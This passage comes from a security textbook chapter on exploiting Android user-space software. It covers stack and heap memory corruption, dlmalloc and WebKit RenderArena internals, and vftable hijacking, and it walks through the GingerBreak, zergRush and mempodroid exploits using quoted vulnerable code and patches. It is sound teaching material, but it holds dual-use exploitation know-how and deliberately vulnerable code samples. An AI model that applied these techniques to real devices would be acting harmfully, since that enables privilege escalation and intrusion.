between different functions. The designated\nstack pointer register could be used for other purposes as well. Therefore a local\nvariable allocated on the stack can be treated like any other memory location\nby an attacker.\nWhat makes vulnerabilities involving local stack variables particularly interest-\ning is that they reside close to other inline control data—that is, saved function\nreturn addresses. Also, all local variables reside next to each other without any\ninterleaving control data, as depicted in Figure 8-1. All information about the stack\nframe layout is implicitly encoded in the native code generated by the compiler.\nAny bounds-checking bug that affects a local variable can then trivially be\nused to overwrite the contents of other local variables or inline control data\nwith attacker-controlled values. Aleph1 was the fi rst to publicly document this\nin his seminal article entitled “Smashing the Stack for Fun and Profi t” (Phrack\n49, Article 14, http://phrack.org/issues.html?issue=49&id=14#article).\nBecause temporary character buffers or arrays of data are often allocated as\nlocal variables on the stack, this is a common vulnerability pattern. A trivial\nexample of vulnerable code looks like the following code.\nVulnerable Stack Buff er Function Example\nvoid getname() {\nstruct {\nchar name[32];\nint age\n} info;\n266 Chapter 8 ■ Exploiting User Space Software\ninfo.age = 23;\nprintf(\"Please enter your name: \");\ngets(info.name);\nprintf(\"Hello %s, I guess you are %u years old?!\\n\", info.name,\ninfo.age);\n}\nThe gets function is notoriously known for not performing any bounds check-\ning. If more than 32 characters are provided on stdin, the program will misbehave.\nThe assembly generated by GCC 4.7.1 with the fl ags -mthumb -mcpu=cortex-a9\n-O2 looks like this:\nDisassembly for the Previous Example\n00000000 <getname>:\n0: f240 0000 movw r0, #0\n↓ Save return address to caller on stack.\n4: b500 push {lr}\n6: 2317 movs r3, #23\n↓ Reserve stack space for local variables.\n8: b08b sub sp, #44\na: f2c0 0000 movt r0, #0\n↓ Initialize stack variable age with fi xed value 23 set to r3 before.\ne: 9301 str r3, [sp, #36]\n10: f7ff fffe bl 0 <printf>\n↓ Calculate stack buffer address as fi rst argument to gets.\n14: a802 add r0, sp, #4\n16: f7ff fffe bl 0 <gets>\n1a: f240 0000 movw r0, #0\n↓ Load age local variable to print it.\n1e: 9a01 ldr r2, [sp, #36]\nc08.indd 11:10:3:AM 02/25/2014 Page 266\nChapter 8 ■ Exploiting User Space Software 267\n↓ Calculate stack buffer address again for printing.\n20: a902 add r1, sp, #4\n22: f2c0 0000 movt r0, #0\n26: f7ff fffe bl 0 <printf>\n2a: b00b add sp, #44\n↓ Load return address from stack and return.\n2c: bd00 pop {pc}\nAs stated earlier, the stack frame layout is encoded entirely in the code of the\nfunction, or more precisely in the sp register relative offsets. The layout on the\nstack is shown in Figure 8-2.\nlow\nsp+4 name[32]\nsp+36 age\nsaved program counter\nhigh\nFigure 8-2: Stack frame layout for example\nWhen an attacker supplies more than 32 bytes of input, he fi rst overwrites\nthe local variable age with bytes 33 to 36 and then the saved return address with\nbytes 37 to 40. He can then redirect the execution fl ow upon function return to a\nlocation of his liking or simply abuse the fact that he can control a local variable\nthat he otherwise would not have been able to change (to make him look older)!\nBecause this type of vulnerability is so common, a generic mitigation was\nimplemented in the GNU C Compiler. This mitigation was enabled by default\nsince the fi rst release of Android. See the “Protecting the Stack” section in Chapter\n12 for more details. Despite this mitigation, vulnerability-specifi c techniques can\nstill be used for attacking applications protected by stack cookies, such as in the\ncase of the zergRush exploit discussed later in this chapter. Also, vanilla stack\nbuffer overfl ows still serve as a very useful introductory example to memory\ncorruption vulnerabilities.\nc08.indd 11:10:3:AM 02/25/2014 Page 267\n268 Chapter 8 ■ Exploiting User Space Software\nHeap Exploitation\nNon-local objects that must live longer than one function’s scope are allocated\non the heap. Arrays and character buffers allocated on the heap are subject to\nthe same bounds-checking issues as those situated on the stack. In addition to\ndata, the heap contains in-bound allocation control metadata for each allocated\nobject. Furthermore, unlike local stack-backed variables, heap allocation lifetimes\nare not automatically managed by the compiler. Heap-based vulnerabilities lend\nthemselves to easier exploitation due to these two facts. Accordingly, more such\nvulnerabilities can be leveraged by an attacker.\nUse-After-Free Issues\nIn a use-after-free scenario, the application code uses a pointer to access an object\nthat has already been marked as free to the heap allocation using the free func-\ntion or delete operator. This is a common bug pattern in complex software that\nis also hard to identify with manual source code auditing. Because the delete\noperator typically relies on free for allocation handling internally, we use them\ninterchangeably here.\nMost heap allocators do not touch the contents of an allocation when freeing\nit. This leaves intact the original data (from when the allocation was previously\nin use). Many allocators store some control information about freed blocks in\nthe fi rst machine words of the free allocation but the majority of the original\nallocation stays intact. When a memory allocation is used after being freed back\nto the allocator, different scenarios may play out:\n■ The freed allocation’s memory has not been used to back a new alloca-\ntion: When the contents are accessed, they are still the same as when the\nobject was still valid. In this case, no visible bug will manifest. However,\nin some cases a destructor may invalidate the object’s contents, which may\nlead to an application crash. This scenario can also lead to information\nleaks that disclose potentially sensitive memory contents to attackers.\n■ The freed allocation could be reused for (parts of) a new allocation: The\ntwo semantically different pointers now point to the same memory loca-\ntion. This often results in a visible crash when the two competing pieces of\ncode interfere with each other. For example, one function might overwrite\ndata in the allocation that is then interpreted as a memory address by the\nother function. This is shown in Figure 8-3.\nA freed block that is not reused by another allocation is not of much use\n(unless one can force the code to free it once more). However, careful input\ncrafting often allows driving the target application to make another allocation\nof similar size to reuse the just-freed spot. The methodology to do that is heap\nallocator specifi c.\nc08.indd 11:10:3:AM 02/25/2014 Page 268\nChapter 8 ■ Exploiting User Space Software 269\nclass A {\nint example_1;\nint example_2;\n}\nexample_1 example_2\nexample_3\nclass B {\nchar example_3[8];\n}\nFigure 8-3: Heap use-after-free aliasing\nCustom Allocators\nMost developers think the heap allocator is part of the operating system. This\nis not true. The operating system merely provides a mechanism to allocate new\npages (4kB in size on most architectures). These pages are then partitioned into\nallocations of the required size by the heap allocator. The heap allocator most\npeople use is part of the C runtime library (libc) they are using. However, an\napplication may use another heap allocator that is backed by operating system\npages. In fact, most desktop browsers do so for performance reasons.\nIt is a common misconception that WebKit-based browsers use the TCmalloc\nallocator on all architectures. This is not true for the Android browser. Although\nit is WebKit based, it makes use of Bionic’s embedded dlmalloc allocator for\nnormal allocations.\nThe Android dlmalloc Allocator\nAndroid’s Bionic libc embeds Doug Lea’s famous dlmalloc allocator that has\nbeen in development since 1987. Many open source libc libraries make use of\ndlmalloc, including older versions of the widespread GNU libc. Newer versions\nof GNU libc use a modifi ed version of the original dlmalloc.\nUp until Android 4.1.2, Bionic bundled the same slightly outdated dlmalloc\n2.8.3 from 2005. In Android 4.2, Bionic was modifi ed to contain an upstream\ndlmalloc in a separate folder. Since then, Android ships with dlmalloc 2.8.6 from\n2012. The following information is valid for both versions.\nThe allocator splits the pages allocated by the operating system into blocks.\nThose blocks consist of an allocator-specifi c control header and the application\nmemory requested. Although memory can be requested at byte granularity, blocks\nare rounded up to multiples of eight bytes in size per default. However, dlmalloc\nallows specifying larger multiples for performance reasons. For example, builds\nfor some Intel boards round to multiples of 16 bytes. In consequence, blocks of\nc08.indd 11:10:3:AM 02/25/2014 Page 269\n270 Chapter 8 ■ Exploiting User Space Software\ndifferent sizes that are rounded up to the same size are treated the same by the\nallocator and can be used interchangeably for fi lling up empty slots in a use-\nafter-free scenario.\ndlmalloc stores inline control data about blocks on the heap to maximize\nperformance of allocations and frees. The inline control data starts two pointer\nsizes before the actual block. These two fi elds hold the sizes of the previous\nand current chunks, allowing the allocator to effectively navigate to neighbor-\ning blocks in both directions. Free blocks also contain additional information\nin the beginning of the user part of an allocated block. For blocks smaller than\n256 bytes, this additional metadata contains a pointer to the next and previous\nfree blocks of the same size in a doubly linked First-In-First-Out (FIFO) list. For\nlarger blocks, free blocks resemble a trie, and subsequently more pointers must\nbe stored. For more details, consult the dlmalloc sources, which are quite com-\nment rich. The overlaid block headers for small blocks are shown in Figure 8-4.\ndlmalloc free dlmalloc allocated\nprevious size previous size\nC P C P\ncurrent size current size\n? ?\nprevious link pointer\nnext link user data\nFigure 8-4: dlmalloc block headers, list\nTo optimize allocation performance, small free blocks are categorized by\nsize. The head of the doubly linked free list is kept in an array called a bin. This\nenables lookups in constant time during allocation. When a block is freed using\nfree, dlmalloc checks if the adjacent blocks are free as well. If so, adjacent blocks\nare merged into the current block. This process is called coalescing. Coalescing\ntakes place before the potentially merged block is put into a bin, therefore bins\ndo not infl uence coalescing behavior (unlike other allocators such as TCmalloc,\nwhich only coalesces chunks that no longer fi t into an allocation cache). This\nbehavior has signifi cant implications for manipulating the heap into a fully\nattacker-controlled state:\n■ When exploiting use-after-free scenarios, an attacker must take care to ensure\nthat adjacent blocks are still in use. Otherwise, a new allocation that was\nsupposed to take up the free spot might be allocated from another cached,\nfree block of the same size instead of the now larger block. Even when the\nc08.indd 11:10:3:AM 02/25/2014 Page 270\nChapter 8 ■ Exploiting User Space Software 271\nallocation is taken from the same block, it might be shifted if the freed block\nwas coalesced with a free block right before it.\n■ For heap buffer overfl ows and other control data corruption attacks, coalesc-\ning with blocks at a lower address can shift the control structures out of\ncontrol of the current block.\nIn either case, coalescing can be mitigated by keeping small in-use allocations\nadjacent to the blocks exploited.\nMany modern heap allocators contain additional security checks during allo-\ncation and freeing to mitigate heap attacks. The checks in dlmalloc only affect\ncontrol data manipulation. free checks the following invariants:\n■ The next adjacent chunk’s address must be after the current chunk’s\naddress. This is to avoid integer overfl ows when adding the current chunk’s\naddress and size.\n■ The previous adjacent chunk must be on the heap, determined by compar-\ning its address with a global minimum address set at initialization. This\nmitigates setting an artifi cially high previous chunk size.\n■ When a chunk is unlinked from the previously mentioned free lists, during\ncoalescing or servicing a new allocation, a safe unlink check is executed.\nThis check verifi es two things. First, it verifi es that the chunk pointed\nto by the forward pointer has a back pointer that points to the original\nchunk. Second, the chunk pointed to by the backward pointer must have\na forward pointer that points to the original chunk. This mitigates over-\nwriting arbitrary pointers with the chunk addresses during the unlinking.\nHowever, memory locations that already contain pointers to the chunks,\nsuch as the bin list heads, could still be overwritten in this fashion.\nThe security checks in malloc are mostly limited to the unlinking checks\nmentioned already.\nAlthough special scenarios exist that are not covered by these checks, it is often\neasier to simply attack application-specifi c pointers on the heap. Many other gen-\neralized techniques are documented in Phrack 66 (in particular, articles 6 and 10,\n“Yet another free() exploitation technique” and “MALLOC DES-MALEFICARUM”)\nand several other sources. One methodology for attacking application-specifi c\npointers is presented in the next section.\nC++ Virtual Function Table Pointers\nPolymorphism in C++ is supported by what is called virtual functions. Those\nfunctions can be specialized for derived classes so that the correct function for\nan object in memory is called even when the calling code knows only about the\nbase class. Discussing all details of object-oriented programming with virtual\nc08.indd 11:10:3:AM 02/25/2014 Page 271\n272 Chapter 8 ■ Exploiting User Space Software\nfunctions goes beyond the scope of this book, but an excellent introduction is\ngiven in B. Stroustrup, The C ++ Programming Language, Addison Wesley (3rd\nedition), 1997.\nOf more interest to the attacker is not the beauty of object-oriented program-\nming in C++ but how virtual function calls are implemented by compilers.\nBecause the resolution of virtual functions happens at runtime, there must be\nsome information stored within a class’s representation in memory. And indeed,\nGCC places a virtual function table pointer—vftable for short—at the beginning of\nan object in-memory. Instead of containing a classic function pointer for each\nvirtual function, this pointer points to a table containing function pointers. This\nis a straightforward object size optimization, as a specifi c instance is always of\na specifi c class type and therefore has a fi xed set of virtual functions. A binary\ncontains a virtual function table for each of its base classes. The pointer to the\nvirtual function table is initialized by the constructor. More information about\nimplementation details can be found in S. Lippman, Inside the C++ Object Model,\nAddison-Wesley, 1996. The basic layout is shown in Figure 8-5.\nheap .text\nclass instance : A, B\nvirtual function table pointer A function pointer 1\nvirtual function table pointer B function pointer 2\nmember 1 function pointer 3\nFigure 8-5: Virtual function table pointer in C++ class\nTherefore any virtual function call requires a memory indirection through\nthe class instance, which is typically allocated in heap memory. On ARM, a\nGCC virtual function call site may look like the following.\nWebKit Virtual Function Call Example\n↓ Load virtual function table pointer into r0 from beginning of class in-memory,\npointed to by r4.\nldr r0, [r4, #0]\nsubs r5, r6, r5\nc08.indd 11:10:3:AM 02/25/2014 Page 272\nChapter 8 ■ Exploiting User Space Software 273\n↓ Load actual function pointer from table at offset 772.\nldr.w r3, [r0, #772]\n↓ Initialize this pointer argument r0 to class pointer from r4.\nmov r0, r4\n↓ Call the function pointer.\nblx r3\nWhen a memory corruption bug on the heap is in play, an attacker can therefore\ntry to manipulate the virtual function table pointer (loaded from r4 into r0 in\nabove example) to his liking. Although vftables normally reside in the binary’s\ntext section, an attacker can point it to a faked virtual function pointer table on\nthe heap. Later, when a virtual method for this object is called, the fake virtual\nfunction pointer table will be used and control fl ow will be diverted to a loca-\ntion of the attacker’s choosing.\nOne weakness of this technique is that the address to call as a function cannot\nbe written directly to the C++ object in memory. Instead, one level of indirec-\ntion is required and the attacker therefore needs to do one of two things. First,\nhe can leak a heap address he can control in order to subsequently provide it\nas virtual function table pointer. Or, he can use application logic to overwrite\nthe virtual function table pointer with a pointer to attacker-controlled data, as\nshowcased in the next section.\nWebKit Specifi c Allocator: The RenderArena\nAs previously stated, programs can contain their own heap allocators that are\noptimized for the program. The WebKit rendering engine contains such an\nallocator for optimizing the RenderTree generation for speed. The RenderTree is a\ncompanion to the Document Object Model (DOM) Tree and contains all elements\non a page annotated with position, styles, and so on that need to be rendered.\nBecause it needs to be rebuilt every time the page layout changes (for example,\nby resizing a Window, changes in the DOM tree, and much more), it needs to\nuse a fast allocator. The C++ objects that represent nodes of the RenderTree are\ntherefore allocated on a special heap allocator called the RenderArena.\nThe RenderArena is not backed directly by operating system chunks but by\nlarge allocations on the main heap. These larger allocations are allocated using\nc08.indd 11:10:3:AM 02/25/2014 Page 273\n274 Chapter 8 ■ Exploiting User Space Software\nthe now familiar dlmalloc and are used to service RenderArena allocations.\nIn this respect, the RenderArena is a heap on a heap. RenderArena allocations\nare 0x1000 bytes plus the arena header, typically totaling 0x1018 bytes in size\non ARM.\nThe allocation strategy of the RenderArena is trivial and quickly explained.\nChunks are never coalesced; they are kept in a singly linked First-In-Last-Out\n(FILO) list for reuse on allocation requests of the same size. If no allocation of\nthe requested size is available, a new block is created at the end of the current\nRenderArena. If the current arena is too small to service the request, a new one\nis simply allocated from dlmalloc. Despite being very simple, this allocation\nstrategy still works well, because only fi xed size C++ classes are allocated on\nthis special heap, so overall there is a small variance in allocation sizes.\nBecause of this simple allocation strategy, no inline metadata is stored for\nallocated blocks. Free blocks have the fi rst machine word replaced with a pointer\nto the next free block of the same size to form the singly linked FILO list men-\ntioned previously.\nPlacing the list pointer for the next free block of same size at the beginning\nof the free block provides an excellent attack opportunity. Because all objects\non the RenderArena are C++ classes derived from a base class with virtual\nfunctions, they all have a virtual function table pointer at the beginning. This\npointer overlaps with the linked list pointer. Therefore, the RenderArena allo-\ncator automatically points the virtual function table pointer to the previously\nfreed block of the same size, as shown in Figure 8-6.\nvirtual function function\ntable pointer pointer 1\nmember 1 member 2\nnext free member 1\nFigure 8-6: vftptr assigned to next free chunk\nIf the contents of an allocation of the same size can be controlled and freed just\nbefore a use-after-free scenario, the native code fl ow can be redirected without\nfurther heap crafting. The “Exploiting the Android Browser” section at the end\nof this chapter discusses one such scenario. In that scenario, it is still possible\nto successfully exploit this even when the full allocation cannot be controlled.\nThis technique was mitigated by Google in recent upstream WebKit releases\nas a direct response to it being presented publicly at Hackito Ergo Sum 2012. The\nlinked list pointers are now masked with a magic value generated at runtime\nand therefore are no longer valid virtual function table pointers. The value is\nc08.indd 11:10:3:AM 02/25/2014 Page 274\nChapter 8 ■ Exploiting User Space Software 275\ngenerated based upon some ASLR entropy and has the most signifi cant bit set.\nThis ensures that the generated value cannot be predetermined and is very\nunlikely to be a valid pointer.\nA History of Public Exploits\nAn overview of many different local privilege escalation exploits was already\nprovided in Chapter 3. This chapter explains three vulnerabilities and their cor-\nresponding public exploits in great detail in an effort to provide some background\nabout existing techniques for user-space exploitation in the Android ecosystem.\nThe fi rst two vulnerabilities affect vold, Android’s custom automatic mounting\ndaemon. This software has been specifi cally developed for the use in Android\nand has a history of security fl aws exposed over two attack surfaces. The fi rst\nvulnerability examined is reachable over a NETLINK socket. These are special\nlocal packet sockets that are typically used for communication between kernel\nand user-space. The second vulnerability is exposed via a UNIX domain socket.\nA UNIX domain socket is bound to a specifi c path in the fi le system and has\nan owning user group as well as fi le permissions. Because this specifi c UNIX\ndomain socket is not accessible to all users, this vulnerability is not reachable\nfrom an exploited browser process.\nThe third exploit examined, mempodroid, utilizes a vulnerability in the Linux\nkernel itself to allow writing to memory of processes running at higher privileges.\nThis primitive is used to cleverly infl uence a set-uid binary to execute a custom\npayload and thereby escalate privileges. Despite relying on a vulnerability in\nkernel code, exploitation happens primarily in user-space context.\nGingerBreak\nThe vold daemon listens on a NETLINK socket waiting to be informed about\nnew disk-related events so it can subsequently mount drives automatically.\nNormally, those messages are sent by the kernel to all user-space programs\nregistered for a specifi c type of messages. However, it is also possible to send\na NETLINK message from one user-space process to another. Consequently, it\nis possible to send messages that were expected to come from the kernel and\nabuse bugs that are exposed via this attack surface. More interestingly, NETLINK\nsockets are currently not restricted by the Android permission model and any\napp can create and communicate using them. This broadens the attack surface\nfor vulnerabilities in NETLINK message handling related code signifi cantly.\nvold uses Android Open Source Project (AOSP) library code to handle and\nparse NETLINK messages. When a new message regarding an event on a block\nc08.indd 11:10:3:AM 02/25/2014 Page 275\n276 Chapter 8 ■ Exploiting User Space Software\ndevice is delivered, a dispatcher class called VolumeManager invokes the virtual\nfunction handleBlockEvent on all registered Volume classes. Each registered class\nthen decides whether this event concerns them or not. The following excerpt\nfrom system/vold/VolumeManager.cpp within the AOSP repository shows the\nimplementation of handleBlockEvent.\nImplementation of handleBlockEvent in vold\nvoid VolumeManager::handleBlockEvent(NetlinkEvent *evt) {\nconst char *devpath = evt->findParam(\"DEVPATH\");\n/* Lookup a volume to handle this device */\nVolumeCollection::iterator it;\nbool hit = false;\nfor (it = mVolumes->begin(); it != mVolumes->end(); ++it) {\nif (!(*it)->handleBlockEvent(evt)) {\n#ifdef NETLINK_DEBUG\nSLOGD(\"Device '%s' event handled by volume %s\\n\", devpath,\n(*it)->getLabel());\n#endif\nhit = true;\nbreak;\n}\n}\nif (!hit) {\n#ifdef NETLINK_DEBUG\nSLOGW(\"No volumes handled block event for '%s'\", devpath);\n#endif\n}\n}\nThe DirectVolume class contains code to handle addition of partitions. This\ncode is invoked when a NETLINK message with the parameter DEVTYPE is\nset to something other than disk. The following excerpt from system/vold/\nDirectVolume.cpp within the AOSP repository shows the implementation of\nthe handlePartitionAdded function from the DirectVolume class.\nVulnerable handlePartitionAdded Code from vold at 8509494\nvoid DirectVolume::handlePartitionAdded(const char *devpath,\nNetlinkEvent *evt) {\nint major = atoi(evt->findParam(\"MAJOR\"));\nint minor = atoi(evt->findParam(\"MINOR\"));\nint part_num;\nc08.indd 11:10:3:AM 02/25/2014 Page 276\nChapter 8 ■ Exploiting User Space Software 277\n↓ Retrieve the PARTN parameter from the NETLINK message.\nconst char *tmp = evt->findParam(\"PARTN\");\nif (tmp) {\npart_num = atoi(tmp);\n} else {\nSLOGW(\"Kernel block uevent missing 'PARTN'\");\npart_num = 1;\n}\n↓ Check a dynamically incremented member variable but no absolute array\nboundaries.\nif (part_num > mDiskNumParts) {\nmDiskNumParts = part_num;\n}\nif (major != mDiskMajor) {\nSLOGE(\"Partition '%s' has a different major than its disk!\",\ndevpath);\nreturn;\n}\n↓ Assign a user-controlled value to the user-controlled index, only upper\nbounded.\nif (part_num > MAX_PARTITIONS) {\nSLOGE(\"Dv:partAdd: ignoring part_num = %d (max: %d)\\n\",\npart_num, MAX_PARTITIONS);\n} else {\nmPartMinors[part_num -1] = minor;\n}\n// …\n}\nThis function does not properly validate the bounds of the part_num vari-\nable. This value is directly supplied by an attacker as the PARTN parameter in\nthe NETLINK message. In the above comparison, it is interpreted as a signed\ninteger and used for accessing a member of an integer array. The index value\nis not checked to see if it is negative. This allows accessing elements that are\nlocated in memory before the mPartMinors array, which is stored on the heap.\nThis enables an attacker to overwrite any 32-bit word located in memory\nbefore the array in question with an attacker-controlled value. The vulnerability\nwas fi xed in the Android 2.3.4 release. The patch is simple and just adds the\nc08.indd 11:10:3:AM 02/25/2014 Page 277\n278 Chapter 8 ■ Exploiting User Space Software\nproper check for negative indexes. The following output from git diff shows\nthe relevant change.\nPatch for the Missing Bounds Check in handlePartitionAdded with f3d3ce5\n--- a/DirectVolume.cpp\n+++ b/DirectVolume.cpp\n@@ -186,6 +186,11 @@ void DirectVolume::handlePartitionAdded\n(const char *devpath, NetlinkEvent *evt)\npart_num = 1;\n}\n↓ The missing bounds checks are added here.\n+ if (part_num > MAX_PARTITIONS || part_num < 1) {\n+ SLOGW(\"Invalid 'PARTN' value\");\n+ part_num = 1;\n+ }\n+\nif (part_num > mDiskNumParts) {\nmDiskNumParts = part_num;\n}\nThis is a classic instance of a write-four primitive. This primitive describes\nthe situation where an attacker-controlled 32-bit value is written to an attacker-\ncontrolled address. The public exploit by Sebastian Krahmer does not require\nan information leak from the target process as it makes use of Android’s crash\nlogging facility instead. Because this exploit was written for rooting your own\ndevice, it assumes it is being executed via an Android Debug Bridge (ADB) shell\nand therefore able to read the system log, which contains some crash information\nas seen in Chapter 7. Normal applications that might seek to elevate privileges\nare not members of the log UNIX group and therefore cannot read the system\nlog that this exploit uses.\nThe GingerBreak first determines the index offset from the exploited\nDirectVolume class instance’s mPartMinors array to the Global Offset Table\n(GOT). Because the affected versions of Android do not have any form of ASLR,\nthe offset is stable across multiple launches of vold. Because vold is automati-\ncally restarted if the process dies, the exploit simply crashes vold with invalid\noffsets. It then reads the crashlog text fi le and parses it for the fault address\nstring, indicating the address of an invalid memory access. In this way, the cor-\nrect index to point into the GOT can be easily calculated if the GOT address itself\nis known. The GOT address is simply determined by parsing the Executable\nc08.indd 11:10:3:AM 02/25/2014 Page 278\nChapter 8 ■ Exploiting User Space Software 279\nand Link Format (ELF) headers of the vold binary on-disk. This also makes the\nexploit work across builds without additional development efforts. Figure 8-7\nshows how a negative index can be used to overwrite the GOT.\nlow\n.text\nGOT\n.data −n\nheap\nhigh\nFigure 8-7: Negative GOT index from the heap\nTo achieve useful code execution, the exploit then overwrites the GOT entry\nof the strcmp function with the address of the system function in libc. Again,\nbecause no ASLR is in effect, the exploit can use the address of system in the\ncurrent process’s libc. It will be the same address inside the target process.\nAfter overwriting the GOT entry, the next time vold invokes strcmp, it executes\nsystem instead.\nThe exploit then sends a NETLINK request with a parameter that will be\ncompared to another, saved string. Because strcmp now points to system, the\nexploit simply provides the path of a binary to execute for this string. When\ncomparing the supplied string to the saved string, vold then actually invokes\nthe binary. Therefore, no native code payload or Return Oriented Programming\n(ROP), as discussed in Chapter 9, is required for this exploit, making it elegant\nand fairly target independent. In exploitation, simplicity is reliability.\nzergRush\nRather than exploiting an issue in the vold code, the second exploit-attacking\nvold exploits a vulnerability in the libsysutils library. This library provides\na generic interface for listening on what it calls Framework sockets, which are\nsimply traditional UNIX domain sockets. The code that extracts text commands\nfrom messages sent to these sockets was vulnerable to common stack buffer\noverfl ows. This vulnerability was fi xed with the Android 4.0 release. However,\nthe attack surface has very limited exposure. The relevant UNIX domain socket is\nonly accessible to root user and the mount group as shown in the following code.\nc08.indd 11:10:3:AM 02/25/2014 Page 279\n280 Chapter 8 ■ Exploiting User Space Software\nvold Framework Socket File Permissions\n# ls -l /dev/socket/vold\nsrw-rw---- root mount 2013-02-21 16:08 vold\nA local ADB shell runs as the shell user, who is a member of the mount\ngroup. Rooting a device via the ADB shell is therefore possible using this bug.\nHowever, this socket is not accessible to other processes running without the\nmount group, such as the browser. If another process uses the same vulnerable\nFrameworkListener code, the vulnerability can be exploited against its socket\nand its privileges can subsequently be assumed.\nThe vulnerable function is used to parse an incoming message on the UNIX\ndomain socket into different space delimited arguments as shown in the\nfollowing code.\nVulnerable function dispatchCommand\nvoid FrameworkListener::dispatchCommand(SocketClient *cli, char *data) {\nFrameworkCommandCollection::iterator i;\nint argc = 0;\nchar *argv[FrameworkListener::CMD_ARGS_MAX];\n↓ A temporary local buffer is allocated on the stack.\nchar tmp[255];\nchar *p = data;\n↓ The pointer q aliases the temporary buffer.\nchar *q = tmp;\nbool esc = false;\nbool quote = false;\nint k;\nmemset(argv, 0, sizeof(argv));\nmemset(tmp, 0, sizeof(tmp));\n↓ This loop iterates over all input characters until a terminating zero is reached.\nwhile(*p) {\n...\nc08.indd 11:10:3:AM 02/25/2014 Page 280\nChapter 8 ■ Exploiting User Space Software 281\n↓ User input is copied into the buffer here, arguments are put into the array\nwithout bounds checks.\n*q = *p++;\nif (!quote && *q == ' ') {\n*q = '\\0';\nargv[argc++] = strdup(tmp);\nmemset(tmp, 0, sizeof(tmp));\n↓ q is reset to the beginning of tmp if there is a space outside a quoted string.\nq = tmp;\ncontinue;\n}\n↓ The target pointer is incremented without further bounds checks.\nq++;\n}\n...\nargv[argc++] = strdup(tmp);\n...\nfor (j = 0; j < argc; j++)\nfree(argv[j]);\nreturn;\n}\nThe patch for this vulnerability was introduced in commit c6b0def to the\ncore directory of the AOSP repository. It introduces a new local variable qlimit\nthat points to the end of tmp. Before writing to q, the developer checks it is not\nequal to or greater than qlimit.\nBecause the return address is saved on the stack, exploitation could be as easy\nas overfl owing the tmp buffer enough to overwrite the saved return address\nand replace it with an address containing the attacker’s native code payload.\nFigure 8-8 shows this simplifi ed scenario.\nHowever, stack cookies are active and therefore a more sophisticated exploita-\ntion strategy is required. As can be seen in the earlier vulnerable code snippet,\nthe code also fails to perform bounds checking on the argv array. The zergRush\nexploit increments the argc variable with 16 dummy elements such that out-of-\nbounds elements of the argv array overlap with the tmp buffer. It then writes\ncontents into tmp that includes pointers to be freed later in the function, allow-\ning the exploit to force a use-after-free scenario for any heap object. This is then\nused to hijack control fl ow using a virtual function table pointer. The overfl owed\nstack frame is depicted in Figure 8-9.\nc08.indd 11:10:3:AM 02/25/2014 Page 281\n282 Chapter 8 ■ Exploiting User Space Software\nsp\nother local variables\nargv[0]\nargv[1]\nc08.indd 11:10:3:AM 02/25/2014 Page 282\n…\nargv[15]\ntmp[0..255]\nstack cookie\noverflow\nsaved program counter\nFigure 8-8: Stack buffer overflow over tmp buffer and return address\nother local variables\nargv[0]\nargv[1]\n…\n…\noverflow\nargv[15]\nargv[16]\ntmp[0..255]\nargv[17]\nstack cookie\nsaved program counter\nFigure 8-9: Stack array overflow into tmp buffer-preserving cookie\nChapter 8 ■ Exploiting User Space Software 283\nBecause the Android 2.3 series introduces the XN mitigation, which does not\nallow an attacker to execute arbitrary code directly, the zergRush exploit utilizes\na very simple ROP chain to set up the arguments for a call to system. Using this\ntechnique, it invokes another binary as root, just like the original GingerBreak\nexploit. ROP is explained in more detail in Chapter 9.\nmempodroid\nA vulnerability in the Linux kernel from 2.6.39 to 3.0 allows users to write into the\nmemory of another process with certain limitations. This vulnerability was dis-\nclosed in January 2012 and affects the Android 4.0 release series because the kernel\nversions in question were only used in conjunction with that Android version.\nLinux exposes a special character device for each process at /proc/\n$pid/mem that represents that process’ virtual memory as a fi le. For obvious\nsecurity reasons, there are strict restrictions on who can read from and write\nto that fi le. Those restrictions require that the process writing to this special\ndevice must be the process owning the memory. Luckily, thanks to the UNIX\neverything-is-a-fi le mentality, an attacker can open the mem device for the target\nprocess and clone it to that process’s stdout and stderr. There are additional\nchecks that need to be circumvented to successfully exploit this vulnerability.\nJason A. Donenfeld documented these restrictions very well in his blog post at\nhttp://blog.zx2c4.com/749.\nWhen stdout has been redirected to the character device linked to virtual\nmemory, the attacker can try to make the program output attacker-controlled\ndata and thereby write to the program’s memory in an unintended location.\nBy seeking in the character device before the program runs, he can control at\nwhich memory location data is written.\nThe mempodroid exploit written by Jay Freeman targets the run-as binary.\nThis binary is much like sudo on traditional Linux systems, in that it allows\nrunning a command as another user. To accomplish this, the program is owned\nby the root user and has the set-uid permission bit set.\nThe exploit simply provides the desired payload to be written to the target\nmemory as the username to impersonate. run-as fails to look up that user\nand print an error message to stderr accordingly. The target address is set by\nseeking the mem device before passing it to the target program. This address\nis the path of the error function leading to program termination via a call to\nexit. Therefore the actual native code exiting with error code after a failed\nuser lookup is replaced by some attacker-controlled code. To keep the amount\nof attacker-controlled code to a minimum, the exploit carefully chooses the\nlocation to hijack to be the call-site of the call to the exit function. It replaces\nthis code with a call to setresuid(0). Then it returns from the function as if no\nerror occurred, which spawns the attacker’s provided command as per normal\nfunctionality as shown in Figure 8-10.\nc08.indd 11:10:3:AM 02/25/2014 Page 283\n284 Chapter 8 ■ Exploiting User Space Software\nD7FC MOV R0, R4 MOV R0, R4\nD7FE BLX exitgroup POP {R0, R1, R4–R6}\nD802 NOP MOVS R5, #0\nD804 MOVW R3, #0×AD57\nD808 BX R3\n0×AD56 MOV R0, R5\nMOV R1, R5\nMOV R2, R5\nBL wrap_setresuid32\nc08.indd 11:10:3:AM 02/25/2014 Page 284\n…\nFigure 8-10: Side-by-side with original and overwritten code\nThis is another very elegant exploit that shines through its simplicity and\nunderstanding of the target program. It uses the existing functionality to run\na process of the attacker’s choosing.\nExploiting the Android Browser\nAs a case study for advanced heap exploitation, this chapter presents a specifi c\nuse-after-free vulnerability in WebKit’s rendering code. This vulnerability,\nalso known as CVE-2011-3068, was fi xed in WebKit upstream commit 100677.\nAt the time of the fi x, bug #70456 was referenced, but unfortunately this bug\nis still closed at the time of this writing. The fi x was merged into the Android\nBrowser’s WebKit with the Android 4.0.4 release (tags android-4.0.4-aah_r1\nand android-4.0.4_r1) in commit d911316 and 538b01d, which were cherry-\npicked from the upstream commit. The exploitation attempt is against a Galaxy\nNexus running Android 4.0.1 (build ITL41F), which is confi rmed vulnerable.\nUnderstanding the Bug\nThe offi cial patch does not point out the bug well, and understanding WebKit\nsource has a high barrier to entry. Luckily for an attacker, the fi xing commit\nalso contains a crash test case to prevent future regressions—and make exploit\ndevelopment easier! When attached with a debugger and the correct symbols\n(see Chapter 7 for a guide on setting up your debugging environment), the\nbrowser crashes as shown in the following example.\nChapter 8 ■ Exploiting User Space Software 285\nCrash on Testcase from Commit 